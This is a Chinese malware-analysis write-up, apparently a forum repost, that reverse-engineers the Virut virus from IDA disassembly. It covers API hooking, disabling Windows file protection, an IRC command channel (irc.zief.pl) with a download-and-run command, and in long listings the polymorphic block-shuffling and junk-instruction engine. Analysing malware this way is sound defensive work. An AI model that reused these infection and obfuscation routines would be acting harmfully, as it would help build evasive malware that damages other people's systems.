
# virut 分析

> 原文：[`www.pediy.com/kssd/pediy10/97877.html`](https://www.pediy.com/kssd/pediy10/97877.html)

## Virut 完整分析

### 前言

写这个东西唯一的目的就是找工作，貌似我太功利了。

大概 2 个月前去某公司应聘，被问住了，无比羞愧中，觉得自己水平真是很差。

## 一：功能分析

`virut`的代码中用了不少`shellcode`的优化技巧，静态分析难度加大了点，不说废话了。

### 1. 通过时间随机确定是否执行病毒体主代码

```
.rsrc:01037C4C 80 EA C2             sub     dl, 0C2h
.rsrc:01037C4F F8                   clc
.rsrc:01037C50 B0 25               mov     al, 25h
.rsrc:01037C52 B2 46               mov     dl, 46h
.rsrc:01037C54 F6 E1               mul     cl
.rsrc:01037C56 00 85 FE 3E 00 00   add     [ebp+3EFEh], al ; 103bb1c  ret  C3+25(0)  根据时间随机
                                     ; 决定 是否执行 CALL 0103BADE
```

### 2. 创建 SECTION 对象

对象名通过时间来随机确定，复制代码到`SECTION`中，并执行。

`SECTION`对象名：`\\BaseNamedObjects\\???tVt`

### 3. 进程列表中从第 4 个进程开始 HOOK 了 ZwCreateFile,ZwQueryInformationProcess，ZwCreateProcessEx，ZwOpenFile

并创建远程线程。

```
.src:01038B2B 83 E9 05            sub     ecx, 5
.rsrc:01038B2E 2B C8             sub     ecx, eax;计算函数偏移
.rsrc:01038B30 51               push    ecx
.rsrc:01038B31 68 00 00 00 E8    push    0E8000000h
.rsrc:01038B36 8D 4C 24 03       lea     ecx, [esp+8+var_5]
.rsrc:01038B3A 6A 00             push    0
.rsrc:01038B3C 6A 05             push    5
.rsrc:01038B3E 51               push    ecx
.rsrc:01038B3F 50               push    eax
.rsrc:01038B40 53               push    ebx
.rsrc:01038B41 6A 05             push    5
.rsrc:01038B43 8B CC             mov     ecx, esp
.rsrc:01038B45 50               push    eax
.rsrc:01038B46 8B D4             mov     edx, esp
.rsrc:01038B48 50               push    eax
.rsrc:01038B49 54               push    esp
.rsrc:01038B4A 6A 40             push    40h
.rsrc:01038B4C 51               push    ecx
.rsrc:01038B4D 52               push    edx
.rsrc:01038B4E 53               push    ebx
.rsrc:01038B4F FF 95 F8 50 1B 00 call    dword ptr [ebp+1B50F8h];修改内存属性
.rsrc:01038B55 83 C4 0C          add     esp, 0Ch
.rsrc:01038B58 FF 95 08 51 1B 00 call    dword ptr [ebp+1B5108h];写入 5 个字节的指令
.rsrc:01038B5E 83 C4 08          add     esp, 8
.rsrc:01038B61 C3               retn
```

### 4. 远程线程

如果进程是`winlogon`，则`PATCH SFC`的 1 号导出函数以关闭文件保护。

```
.remote:001B220C             mov     edx, ss:ExitThread[ebp]
.remote:001B2212             sub     edx, edi
.remote:001B2214             sub     edx, 7
.remote:001B2217             mov     dword ptr [edi], 0E8006Ah
.remote:001B221D             mov     [edi+3], edx    ; 替换   调用完 NtWaitForMultipleObjects
                                    ;   线程直接退出
.remote:001B2220             retn
```

(下面不贴代码了 没意思)

写入注册表`HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List`
键为：文件路径，值为：文件路径:`*`:enabled:`@shell32.dll,-1`

打开`\\Device\\PhysicalMemory`对象，并创建线程恢复`SSDT`。

连接到`irc.zief.pl`。

发送：
- `NICK ????????`
- `USER ?`

发送：
- 版本号
- `#硬盘序列号`
- 序列号累加和最后一字节
- `Service Pack`版本
- `\nJOIN`

发送：
- `#.364\n`

接收命令：

接收：
- `PING`，则发送：`POIN`
- 设置注册表项`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer`，键为`UpdateHost`，值为端口和主机 IP 的二进制值
- `PRIV`，子命令为`!get`则下载文件并运行
- 子命令为`!host`则更新主机网址

## 二：变形的恢复

`virut`代码大致可以分为 2 部分：`header`和`body`。它的变种不少，但基本上只是`header`变化，`body`功能不变。

而对于附件中的样本来说，感染的过程中`header`多态变形(其实就是加花并乱序排列)，`body`通过存放在`header`中的随机`key`加密自己。

在感染前，`virut`会自己把变形后的`header`还原。

还原时，`virut`依靠两个结构`BLOCK_DESCRI`和`RELOC_DESCRI`来转换的。

```
00000000 BLOCK_DESCRI     struc ; (sizeof=0x8)
00000000 o_NumberOfOpcode dw ?                  ; 变形前的 opcode 数目
00000002 o_offsetStart    dw ?                  ; 本块指令 变形前 在 virut 中的偏移
00000004 n_offsetStart    dw ?                  ; 本快指令变形后 在 virut 中的偏移
00000006 n_NumberOfOpcode dw ?                  ; 变形后 本块指令中 opcode 数目
00000006                     ; 最高位为 1 时代表 本块指令变形前是以跳转指令或者返回指令结尾
00000008 BLOCK_DESCRI     ends

00000000 RELOC_DESCRI     struc ; (sizeof=0x6)
00000000 o_offset         dw ?                  ; 跳转指令操作数 变形前在 virut 中的偏移
00000002 NexOffset        dw ?                  ; 跳转指令 下一条指令的偏移
00000004 TarOffset        dw ?                  ; 跳转指令目的地址的偏移
00000006 RELOC_DESCRI     ends
```

`virut`多态的过程，实际上是把`header`分成一个个小的`BLOCK`随机排列，并把相关信息用`BLOCK_DESCRI`描述。

`RELOC_DESCRI`是描述`header`中的`CALL`以及`JMP`之类需要重定位操作数的指令相关信息。

`RELOC_DESCRI`的值是固定不变的。

```
.remote:001B1664                     restore_virut:                    ; DATA XREF: .remote:restore_virut

.remote:001B1664 2D 64 16 1B 00              sub     eax, offset restore_virut ; 变形代码恢复
.remote:001B1669 5E                         pop     esi          ; virut_body 病毒体起始处
.remote:001B166A 8B E8                       mov     ebp, eax
.remote:001B166C 8D B8 00 10 1B 00          lea     edi, old_header[eax] ; 变形前的 virut_header
.remote:001B1672 01 04 24                    add     [esp], eax
.remote:001B1675 2B B5 20 1B 1B 00          sub     esi, ss:new_body_offset[ebp] ; 得到变形后的 virut 代码开始处
.remote:001B167B 33 D2                       xor     edx, edx
.remote:001B167D FE 8D 23 17 1B 00          dec     ss:number_block[ebp] ; 多态加密时 分块的个数

.remote:001B1683

.remote:001B1683                     loc_1B1683:                      ; CODE XREF: .remote:001B16E6j
.remote:001B1683 56                         push    esi          ; after_change_virut_header 入栈
.remote:001B1684 0F B7 9C D5 28 17+       movzx   ebx, ss:block.n_offsetStart[ebp+edx*8]
.remote:001B168C 0F B7 8C D5 2A 17+       movzx   ecx, ss:block.n_NumberOfOpcode[ebp+edx*8]
.remote:001B1694 03 F3                       add     esi, ebx
.remote:001B1696 3B 9D 20 1B 1B 00          cmp     ebx, ss:new_body_offset[ebp] ; 变形后的 body 在 virut 中的偏移
.remote:001B169C 76 06                       jbe     short continue_restore ; 是否处理完  长度比较
.remote:001B169E 81 EB 34 3D 00 00          sub     ebx, 3D34h

.remote:001B16A4

.remote:001B16A4                     continue_restore:               ; CODE XREF: .remote:001B169Cj
.remote:001B16A4 81 E1 FF 7F 00 00         and     ecx, 7FFFh

.remote:001B16AA

.remote:001B16AA                     loc_1B16AA:                     ; CODE XREF: .remote:001B16DBj
.remote:001B16AA 0F A3 9D 44 1A 1B+        bt      ss:is_rabish[ebp], ebx ;   位测试为 1 的则是垃圾指令
.remote:001B16B1 73 03                       jnb     short loc_1B16B6 ; 是否是花指令
.remote:001B16B3 46                           inc     esi          ; 变形后的 header 地址增 1
.remote:001B16B4 EB 24                       jmp     short loc_1B16DA
.remote:001B16B6                     ; ---------------------------------------------------------------------------

.remote:001B16B6

.remote:001B16B6                     loc_1B16B6:                     ; CODE XREF: .remote:001B16B1j
```



```
.remote:001B16B6 83 BD 24 1B 1B 00+             cmp     ss:flag_code_change[ebp], 0 ; 不是花指令
.remote:001B16BD 74 1A                         jz      short loc_1B16D9
.remote:001B16BF 8B C3                         mov     eax, ebx        ; ebx 表示处理的指令  RVA
.remote:001B16C1 2B 85 24 1B 1B 00             sub     eax, ss:flag_code_change[ebp] ; 要替换回来的指令 RVA   virut 感染后
.remote:001B16C1                                  ; 此处的代码会变  感染前是 mov     ebx, [esp+24h] 4 字节
.remote:001B16C1                                  ; 感染后是 mov     ebx, dword ptr ds:InterlockedIncrement
.remote:001B16C1                                  ; 变为 5 字节
.remote:001B16C7 72 10                         jb      short loc_1B16D9
.remote:001B16C9 83 F8 04                      cmp     eax, 4
.remote:001B16CC 73 0B                         jnb     short loc_1B16D9
.remote:001B16CE 8A 84 28 28 1B 1B+            mov     al, byte ptr changed_code[eax+ebp]
.remote:001B16D5 46                             inc     esi
.remote:001B16D6 AA                             stosb
.remote:001B16D7 EB 01                         jmp     short loc_1B16DA
.remote:001B16D9                                  ; ---------------------------------------------------------------------------
.remote:001B16D9
.remote:001B16D9                     loc_1B16D9:                           ; CODE XREF: .remote:001B16BDj
.remote:001B16D9                                  ; .remote:001B16C7j ...
.remote:001B16D9 A4                             movsb
.remote:001B16DA
.remote:001B16DA                     loc_1B16DA:                           ; CODE XREF: .remote:001B16B4j
.remote:001B16DA                                  ; .remote:001B16D7j
.remote:001B16DA 43                             inc     ebx
.remote:001B16DB E2 CD                         loop    loc_1B16AA      ; header_1 处理完后
.remote:001B16DD FE C2                         inc     dl
.remote:001B16DF 5E                             pop     esi
.remote:001B16E0 3A 95 23 17 1B 00             cmp     dl, ss:number_block[ebp] ; 多态加密时 分块的个数
.remote:001B16E6 72 9B                         jb      short loc_1B1683 ; after_change_virut_header 入栈
.remote:001B16E8 68 22 00 00 00                push    22h
.remote:001B16ED 8D B5 2C 1B 1B 00             lea     esi, reloc_jmp.o_offset[ebp]
.remote:001B16F3 59                             pop     ecx
.remote:001B16F4
.remote:001B16F4                     loc_1B16F4:                           ; CODE XREF: .remote:001B170Bj
.remote:001B16F4 0F B7 16                      movzx   edx, word ptr [esi]
.remote:001B16F7 0F B7 46 04                   movzx   eax, [esi+RELOC_DESCRI.TarOffset] ; 跳转指令目的地址的偏移
.remote:001B16FB 0F B7 5E 02                   movzx   ebx, [esi+RELOC_DESCRI.NexOffset] ; 跳转指令 下一条指令的偏移
.remote:001B16FF 2B C3                         sub     eax, ebx
.remote:001B1701 89 84 2A 00 10 1B+            mov     dword ptr old_header[edx+ebp], eax
.remote:001B1708 83 C6 06                      add     esi, 6
.remote:001B170B E2 E7                         loop    loc_1B16F4
.remote:001B170D C6 85 8F 11 1B 00+            mov     byte ptr [ebp+1B118Fh], 0
.remote:001B1714 C6 85 E0 11 1B 00+            mov     byte ptr ss:decode_call[ebp], 0C3h ; call 1b104c
.remote:001B171B 83 A5 DA 54 1B 00+             and     ss:dword_1B54DA[ebp], 0
.remote:001B1722 C3                             retn
```

这段代码 已经逆出来了  写在附件的 `nochange.py`   用 `IDAPython` 执行的  需要修改 `main` 函数的参数才能直接运行

也可以在 `virut_change.idb` 上直接运行脚本 不用修改参数 运行后 会生成 `virut_header.bin` 就是变形前的 header 了

附件中的 `virut_header.bin` 是恢复好的 header 共 1e8 字节  有兴趣的人可以对比下还原前和还原后的 header 代码

### 三:变形

`virut` 通过 `HOOK` 目标进程的 `ZwCreateFile`, `ZwOpenFile` 实现感染

感染本身的过程不多说了  只要是个病毒 都那样搞的  感兴趣的是怎么实现 加花的

惭愧 分析完这个之后 我才算知道 怎么加花~

#### 1.分块

分块的大体思路是这样的   先随机出 每个 `BLOCK` 应该包含的指令数  然后通过 长度反汇编引擎得到 指令的长度 填充

`BLOCK_DESCRI` 在 header 中有些特殊的地址 比如存放的字符串  以及解密 body 的随机 `KEY`   当分块到它们时 不能

直接用长度反汇编引擎  因为它们根本不是指令  所以需要特殊照顾 代码如下:

```
.remote:001B38C1 004 C6 85 E8 38 1B 00+          mov     byte ptr ss:(loc_1B38E7+1)[ebp], 3 ; 设置机器码为 push 3 其实就是随机的参数
.remote:001B38C8
.remote:001B38C8                     loc_1B38C8:                           ; CODE XREF: sub_1B37FD+18Fj
.remote:001B38C8 004 83 A5 24 1B 1B 00+          and     ss:flag_code_change[ebp], 0 ; 要替换回来的指令 RVA   virut 感染后
.remote:001B38C8 004 00                            ; 此处的代码会变  感染前是 mov     ebx, [esp+24h] 4 字节
.remote:001B38C8                                ; 感染后是 mov     ebx, dword ptr ds:InterlockedIncrement
.remote:001B38C8                                ; 变为 6 字节
.remote:001B38CF 004 C6 85 23 17 1B 00+          mov     ss:number_block[ebp], 1 ; 多态加密时 分块的个数
.remote:001B38D6 004 8D B5 00 10 1B 00           lea     esi, old_header[ebp]
.remote:001B38DC 004 8D BD 24 17 1B 00           lea     edi, block.o_NumberOfOpcode[ebp]
.remote:001B38E2 004 66 83 67 02 00              and     [edi+BLOCK_DESCRI.o_offsetStart], 0 ; 清空偏移
.remote:001B38E7
.remote:001B38E7                     loc_1B38E7:                           ; CODE XREF: sub_1B37FD+184j
.remote:001B38E7                                ; DATA XREF: sub_1B37FD:map_successw ...
.remote:001B38E7 004 6A 03                       push    3
.remote:001B38E9 008 58                          pop     eax
.remote:001B38EA 004 66 83 27 00                 and     word ptr [edi], 0
.remote:001B38EE 004 66 C7 47 06 00 80           mov     word ptr [edi+6], 8000h;设置跳转标志
.remote:001B38F4 004 E8 2F E9 FF FF              call    rand_mul        ; 返回[0:eax)
.remote:001B38F9 004 8D 4A 03                    lea     ecx, [edx+3]    ; 随机出 每个 BLOCK 包含的指令为 3~5 条
.remote:001B38FC
.remote:001B38FC                     loc_1B38FC:                           ; CODE XREF: sub_1B37FD+165j
.remote:001B38FC 004 51                          push    ecx
.remote:001B38FD 008 8D 85 0A 10 1B 00           lea     eax, event_name[ebp] ; "Vx_5"
.remote:001B3903 008 8D 8D 4A 10 1B 00           lea     ecx, rand_key[ebp] ; 解密 body 的密钥
.remote:001B3909 008 8D 95 E0 11 1B 00           lea     edx, decode_call[ebp] ; call 1b104c
.remote:001B390F 008 3B F0                       cmp     esi, eax         ;这里是 3 个特殊点
.remote:001B3911 008 75 08                       jnz     short loc_1B391B ;遇到特殊的 3 个点 直接得到长度
.remote:001B3913 008 68 05 00 00 00              push    5
.remote:001B3918 00C 59                          pop     ecx
.remote:001B3919 008 EB 37                       jmp     short loc_1B3952
.remote:001B391B                                  ; ---------------------------------------------------------------------------
.remote:001B391B
.remote:001B391B                     loc_1B391B:                           ; CODE XREF: sub_1B37FD+114j
.remote:001B391B 008 3B F1                       cmp     esi, ecx
.remote:001B391D 008 75 05                       jnz     short loc_1B3924
.remote:001B391F 008 6A 02                       push    2
.remote:001B3921 00C 59                          pop     ecx
.remote:001B3922 008 EB 2E                       jmp     short loc_1B3952
```



```
.remote:001B3924 ; ---------------------------------------------------------------------------

.remote:001B3924

.remote:001B3924 loc_1B3924: ; CODE XREF: sub_1B37FD+120j

.remote:001B3924 008 3B F2 cmp esi, edx

.remote:001B3926 008 75 09 jnz short loc_1B3931

.remote:001B3928 008 6A 05 push 5

.remote:001B392A 00C C6 47 07 00 mov byte ptr [edi+7], 0

.remote:001B392E 00C 59 pop ecx

.remote:001B392F 008 EB 21 jmp short loc_1B3952

.remote:001B3931 ; ---------------------------------------------------------------------------

.remote:001B3931

.remote:001B3931 loc_1B3931: ; CODE XREF: sub_1B37FD+129j

.remote:001B3931 008 8A 06 mov al, [esi]

.remote:001B3933 008 3C E9 cmp al, 0E9h ;检验是否是跳转指令和返回指令

.remote:001B3935 008 74 0C jz short loc_1B3943

.remote:001B3937 008 3C EB cmp al, 0EBh

.remote:001B3939 008 74 08 jz short loc_1B3943

.remote:001B393B 008 3C C2 cmp al, 0C2h

.remote:001B393D 008 74 04 jz short loc_1B3943

.remote:001B393F 008 3C C3 cmp al, 0C3h

.remote:001B3941 008 75 06 jnz short loc_1B3949 ; 不是跳转指令或者返回指令

.remote:001B3943

.remote:001B3943 loc_1B3943: ; CODE XREF: sub_1B37FD+138j

.remote:001B3943 ; sub_1B37FD+13Cj ...

.remote:001B3943 008 C6 47 07 80 mov byte ptr [edi+7], 80h ; 设置跳转指令的标志

.remote:001B3947 008 EB 04 jmp short loc_1B394D

.remote:001B3949 ; ---------------------------------------------------------------------------

.remote:001B3949

.remote:001B3949 loc_1B3949: ; CODE XREF: sub_1B37FD+144j

.remote:001B3949 008 C6 47 07 00 mov byte ptr [edi+7], 0 ; 清空标志

.remote:001B394D

.remote:001B394D loc_1B394D: ; CODE XREF: sub_1B37FD+14Aj

.remote:001B394D 008 E8 C2 12 00 00 call get_instruction_length;长度反汇编引擎

.remote:001B3952

.remote:001B3952 loc_1B3952: ; CODE XREF: sub_1B37FD+11Cj

.remote:001B3952 ; sub_1B37FD+125j ...

.remote:001B3952 008 66 01 0F add [edi], cx

.remote:001B3955 008 8D 85 E8 11 1B 00 lea eax, loc_1B11E8[ebp]

.remote:001B395B 008 03 F1 add esi, ecx

.remote:001B395D 008 3B F0 cmp esi, eax

.remote:001B395F 008 59 pop ecx

.remote:001B3960 004 73 2F jnb short loc_1B3991 ; 分块结束从此处跳出

.remote:001B3962 004 E2 98 loop loc_1B38FC

.remote:001B3964 004 FE 85 23 17 1B 00 inc ss:number_block[ebp] ; 多态加密时 分块的个数

.remote:001B396A 004 80 BD 23 17 1B 00+ cmp ss:number_block[ebp], 63h ; 多态加密时 分块的个数

.remote:001B3971 004 77 13 ja short loc_1B3986

.remote:001B3973 004 66 8B 47 02 mov ax, [edi+BLOCK_DESCRI.o_offsetStart] ; 本块指令 变形前 在 virut 中的偏移

.remote:001B3977 004 66 03 07 add ax, [edi]

.remote:001B397A 004 83 C7 08 add edi, 8 ; 偏移+数目 = 下一块指令的偏移

.remote:001B397D 004 66 89 47 02 mov [edi+BLOCK_DESCRI.o_offsetStart], ax ; 本块指令 变形前 在 virut 中的偏移

.remote:001B3981 004 E9 61 FF FF FF jmp loc_1B38E7

.remote:001B3986 ; ---------------------------------------------------------------------------

.remote:001B3986

.remote:001B3986 loc_1B3986: ; CODE XREF: sub_1B37FD+174j

.remote:001B3986 004 FE 85 E8 38 1B 00 inc byte ptr ss:(loc_1B38E7+1)[ebp]

.remote:001B398C 004 E9 37 FF FF FF jmp loc_1B38C8 ; 如果分块过多的话 增加 随机的指令数

.remote:001B3991 ; ---------------------------------------------------------------------------

.remote:001B3991

.remote:001B3991 loc_1B3991: ; CODE XREF: sub_1B37FD+163j

.remote:001B3991 004 83 C7 08 add edi, 8

.remote:001B3994 004 66 C7 07 34 3D mov [edi+BLOCK_DESCRI.o_NumberOfOpcode], 3D34h ; 描述 病毒体

.remote:001B3999 004 66 C7 47 02 E8 01 mov [edi+BLOCK_DESCRI.o_offsetStart], 1E8h ; 本块指令 变形前 在 virut 中的偏移

.remote:001B399F 004 66 C7 47 06 34 BD mov [edi+BLOCK_DESCRI.n_NumberOfOpcode], 0BD34h ; 变形后 本块指令中 opcode 数目

.remote:001B399F 004 ; 最高位为 1 时代表 本块指令变形前是以跳转指令或者返回指令结尾

.remote:001B39A5 004 FE 85 23 17 1B 00 inc ss:number_block[ebp] ; 多态加密时 分块的个数

.remote:001B39AB 004 8B B5 86 54 1B 00 mov esi, ss:lpFileBase[ebp]
```

理论上分块可以无限多，但是实际上分块不能超过 `80H` 个。`virut` 设置了 4 个双字作为 `BIT STRING` 确定 `BLOCK` 是否被处理过的。

分块超过 `80H` 时，会覆盖 `BIT STRING` 下面的数据。不过对于病毒来说，`80H` 的块足够了。

### 2. 乱序排列

这里的代码更长了....

基本思路就是：随机一个数，通过这个数确定先复制哪个 `BLOCK`。循环直到复制完毕。复制的过程中通过随机数确定是否插入花指令。复制完后如果 `BLOCK` 不是以跳转指令或者返回指令结尾，就增加一个跳转指令，以便将变形前在一起的 `BLOCK` 变形后可以通过跳转指令连接在一起。

```
.remote:001B3BD0 010 8B BD CE 54 1B 00 mov edi, ss:virut_start_in_file_off[ebp]

.remote:001B3BD6

.remote:001B3BD6 loc_1B3BD6: ; CODE XREF: sub_1B37FD+23Fj

.remote:001B3BD6 ; sub_1B37FD+249j

.remote:001B3BD6 010 0F B6 8D 23 17 1B+ movzx ecx, ss:number_block[ebp] ; 多态加密时 分块的个数

.remote:001B3BDD

.remote:001B3BDD loc_1B3BDD: ; CODE XREF: sub_1B37FD+60Ej

.remote:001B3BDD 010 8B C1 mov eax, ecx

.remote:001B3BDF 010 E8 44 E6 FF FF call rand_mul ; 返回[0:eax)

.remote:001B3BE4 010 33 C0 xor eax, eax ; 随机 0~number_block 这里 开始乱序 排列指令块

.remote:001B3BE6

.remote:001B3BE6 loc_1B3BE6: ; CODE XREF: sub_1B37FD+3F8j

.remote:001B3BE6 010 0F A3 85 BE 54 1B+ bt ss:flag_block[ebp], eax ; 这里 4 个双字代表 BLOCK 是否已经变形的标志位串

.remote:001B3BE6 010 00 ; 这里也可以看出 分块时数量不能超过 80H

.remote:001B3BED 010 72 04 jb short loc_1B3BF3

.remote:001B3BEF 010 FE CA dec dl

.remote:001B3BF1 010 78 04 js short loc_1B3BF7

.remote:001B3BF3

.remote:001B3BF3 loc_1B3BF3: ; CODE XREF: sub_1B37FD+3F0j

.remote:001B3BF3 010 FE C0 inc al

.remote:001B3BF5 010 EB EF jmp short loc_1B3BE6 ; 找到第 dl 个未处理的指令块
```



```
.remote:001B3BF7                 ; ---------------------------------------------------------------------------
.loc_1B3BF7:                     ; CODE XREF: sub_1B37FD+3F4j
                                  mov     edx, edi
                                  bts     ss:flag_block[ebp], eax ; 置位 flag_block 对应的 BIT  表示 该指令块已被处理过
                                  sub     edx, ss:virut_start_in_file_off[ebp]
                                  push    ecx
                                  mov     ss:block.n_offsetStart[ebp+eax*8], dx
                                  movzx   esi, ss:block.o_offsetStart[ebp+eax*8]
                                  movzx   ecx, word ptr ss:block.o_NumberOfOpcode[ebp+eax*8]
                                  cmp     esi, 1E8h ;1E8 是变形前 HEADER 的大小
                                  lea     esi, old_header[ebp+esi]
                                  jnz     short loc_1B3C3E
                                  shr     ecx, 2        ; 复制 body 到宿主中去
                                  mov     ss:new_body_offset[ebp], edx ; 变形后的 body 在 virut 中的偏移
                                  rep movsd
                                  jmp     loc_1B3DF1

loc_1B3C3E:                       ; CODE XREF: sub_1B37FD+42Fj
                                   ; sub_1B37FD+5EFj
                                  test    ecx, ecx
                                  jz      loc_1B3DF1      ; 指令块处理完则跳
                                  push    ecx             ; 还需要处理的 opcode 数目
                                  push    eax             ; 指令块结构数组的 下标
                                  mov     al, 2
                                  call    rand_mul        ; 返回[0:eax)
                                  or      dl, dl
                                  jnz     loc_1B3DA3      ; 随机生成 0，1  为 1 则生成花指令
                                  mov     eax, esi
                                  sub     eax, ebp
                                  cmp     eax, offset event_name ; "Vx_5"
                                  jnz     short loc_1B3C6D ; 3 个特殊点
                                  push    5
                                  pop     ecx
                                  jmp     loc_1B3D92

loc_1B3C6D:                       ; CODE XREF: sub_1B37FD+463j
                                  cmp     eax, offset rand_key ; 解密 body 的密钥
                                  jnz     short loc_1B3C7C
                                  push    2
                                  pop     ecx
                                  jmp     loc_1B3D92

loc_1B3C7C:                       ; CODE XREF: sub_1B37FD+475j
                                  cmp     eax, offset decode_call ; call 1b104c
                                  jnz     short loc_1B3C8B
                                  push    5
                                  pop     ecx
                                  jmp     loc_1B3D92

loc_1B3C8B:                       ; CODE XREF: sub_1B37FD+484j
                                  cmp     ss:flag_find_import[ebp], 0FFh ; 是否找到导入 kernel 的函数
                                  jz      short no_find
                                  cmp     eax, offset code_change ; 被修改的函数
                                  jb      short no_find
                                  cmp     eax, offset loc_1B10E3
                                  jnb     short no_find
                                  cmp     byte ptr [esi+1], 5Ch
                                  jnz     short no_find
                                  lodsd
                                  mov     edx, edi
                                  mov     dword ptr ss:changed_code[ebp], eax
                                  stosb                 ; 存入 mov 指令
                                  mov     al, 1Dh
                                  sub     edx, ss:virut_start_in_file_off[ebp]
                                  stosb
                                  push    4
                                  mov     eax, ss:va_thunk_data[ebp]
                                  cmp     edx, ss:new_body_offset[ebp] ; 变形后的 body 在 virut 中的偏移
                                  jbe     short loc_1B3CD1
                                  sub     edx, 3D34h

loc_1B3CD1:                       ; CODE XREF: sub_1B37FD+4CCj
                                  pop     ecx
                                  stosd                 ; 生成 mov ebx,dword ptr[xxxxxxxx]
                                  mov     ss:flag_code_change[ebp], edx ; 要替换回来的指令 RVA   virut 感染后
                                 ; 此处的代码会变  感染前是 mov     ebx, [esp+24h] 4 字节
                                 ; 感染后是 mov     ebx, dword ptr ds:InterlockedIncrement
                                 ; 变为 6 字节

loc_1B3CD9:                       ; CODE XREF: sub_1B37FD+4E4j
                                  btr     ss:is_rabish[ebp], edx ;  位测试为 1 的则是垃圾指令
                                  inc     edx
.loop_1B3CD9:
                                  loop    loc_1B3CD9      ; 设置标志
                                  mov     eax, [esp+1Ch+var_1C]
                                  add     ss:block.n_NumberOfOpcode[ebp+eax*8], 4
```



```
.remote:001B3CEF 01C 83 6C 24 04 04                         sub     [esp+1Ch+var_18], 4 ; 需处理的数目-4  

.remote:001B3CF4 01C B1 02                                   mov     cl, 2  

.remote:001B3CF6 01C E9 BA 00 00 00                          jmp     loc_1B3DB5       ; 修改指令为 bts  

.remote:001B3CF6                 ; END OF FUNCTION CHUNK FOR sub_1B37FD  

.remote:001B3CFB                 ; ---------------------------------------------------------------------------  

.remote:001B3CFB E9 92 00 00 00                              jmp     loc_1B3D92  

.remote:001B3D00                 ; ---------------------------------------------------------------------------  

.remote:001B3D00                 ; START OF FUNCTION CHUNK FOR sub_1B37FD  

.remote:001B3D00  

.remote:001B3D00                 no_find:                          ; CODE XREF: sub_1B37FD+495j  

.remote:001B3D00                                             ; sub_1B37FD+49Cj ...  

.remote:001B3D00 01C 3D 73 11 1B 00                          cmp     eax, offset ret_to_host  

.remote:001B3D05 01C 0F 85 82 00 00 00                        jnz     loc_1B3D8D  

.remote:001B3D0B 01C 80 BD 10 55 1B 00+                        cmp     ss:flag_find_import[ebp], 0 ; 是否找到导入 kernel 的函数  

.remote:001B3D12 01C 72 79                                     jb      short loc_1B3D8D  

.remote:001B3D14 01C 80 BD 10 55 1B 00+                        cmp     ss:flag_find_import[ebp], 2 ; 是否找到导入 kernel 的函数  

.remote:001B3D1B 01C 73 70                                     jnb     short loc_1B3D8D  

.remote:001B3D1D 01C 80 BD 10 55 1B 00+                        cmp     ss:flag_find_import[ebp], 0 ; 是否找到导入 kernel 的函数  

.remote:001B3D24 01C 75 06                                     jnz     short loc_1B3D2C  

.remote:001B3D26 01C 89 BD 12 55 1B 00                          mov     ss:ret_to_host_address[ebp], edi  

.remote:001B3D2C  

.remote:001B3D2C                 loc_1B3D2C:                       ; CODE XREF: sub_1B37FD+527j  

.remote:001B3D2C 01C 0F B6 85 11 55 1B+                        movzx   eax, ss:rand_flag[ebp] ; 决定恢复 OEP 的两条指令  顺序  

.remote:001B3D33 01C 6A 07                                     push    7  

.remote:001B3D35 020 6B C0 03                                  imul    eax, 3  

.remote:001B3D38 020 59                                        pop     ecx  

.remote:001B3D39 01C 8B 95 FE 54 1B 00                          mov     edx, ss:old_entrypoint[ebp]  

.remote:001B3D3F 01C 80 BD 10 55 1B 00+                        cmp     ss:flag_find_import[ebp], 1 ; 是否找到导入 kernel 的函数  

.remote:001B3D46 01C 75 05                                     jnz     short loc_1B3D4D  

.remote:001B3D48 01C 83 C2 04                                  add     edx, 4  

.remote:001B3D4B 01C 2B D0                                     sub     edx, eax  

.remote:001B3D4D  

.remote:001B3D4D                 loc_1B3D4D:                       ; CODE XREF: sub_1B37FD+549j  

.remote:001B3D4D 01C 03 C8                                     add     ecx, eax  

.remote:001B3D4F 01C B0 C6                                     mov     al, 0C6h  

.remote:001B3D51 01C 02 85 11 55 1B 00                          add     al, ss:rand_flag[ebp] ; 决定恢复 OEP 的两条指令  顺序  

.remote:001B3D57 01C AA                                        stosb  

.remote:001B3D58 01C B0 05                                     mov     al, 5  

.remote:001B3D5A 01C AA                                        stosb  

.remote:001B3D5B 01C 8B C2                                     mov     eax, edx  

.remote:001B3D5D 01C 03 43 34                                  add     eax, [ebx+34h]  

.remote:001B3D60 01C AB                                        stosd  

.remote:001B3D61 01C 03 95 E6 54 1B 00                          add     edx, ss:entrypoint_offset_sub_rva[ebp]  

.remote:001B3D67 01C 03 95 86 54 1B 00                          add     edx, ss:lpFileBase[ebp]  

.remote:001B3D6D 01C 8B 02                                     mov     eax, [edx]  

.remote:001B3D6F 01C 80 BD 11 55 1B 00+                        cmp     ss:rand_flag[ebp], 0 ; 决定恢复 OEP 的两条指令  顺序  

.remote:001B3D76 01C 75 03                                     jnz     short loc_1B3D7B  

.remote:001B3D78 01C AA                                        stosb  

.remote:001B3D79 01C EB 01                                     jmp     short loc_1B3D7C  

.remote:001B3D7B                 ; ---------------------------------------------------------------------------  

.remote:001B3D7B  

.remote:001B3D7B                 loc_1B3D7B:                       ; CODE XREF: sub_1B37FD+579j  

.remote:001B3D7B 01C AB                                        stosd  

.remote:001B3D7C  

.remote:001B3D7C                 loc_1B3D7C:                       ; CODE XREF: sub_1B37FD+57Cj  

.remote:001B3D7C 01C FE 85 10 55 1B 00                          inc     ss:flag_find_import[ebp] ; 是否找到导入 kernel 的函数  

.remote:001B3D82 01C 80 B5 11 55 1B 00+                        xor     ss:rand_flag[ebp], 1 ; 决定恢复 OEP 的两条指令  顺序  

.remote:001B3D89 01C EB 2A                                     jmp     short loc_1B3DB5 ; 修改指令为 bts  

.remote:001B3D89                 ; END OF FUNCTION CHUNK FOR sub_1B37FD  

.remote:001B3D8B                 ; ---------------------------------------------------------------------------  

.remote:001B3D8B EB 05                                       jmp     short loc_1B3D92  

.remote:001B3D8D                 ; ---------------------------------------------------------------------------  

.remote:001B3D8D                 ; START OF FUNCTION CHUNK FOR sub_1B37FD  

.remote:001B3D8D  

.remote:001B3D8D                 loc_1B3D8D:                       ; CODE XREF: sub_1B37FD+508j  

.remote:001B3D8D                                             ; sub_1B37FD+515j ...  

.remote:001B3D8D 01C E8 82 0E 00 00                          call    get_instruction_length  

.remote:001B3D92  

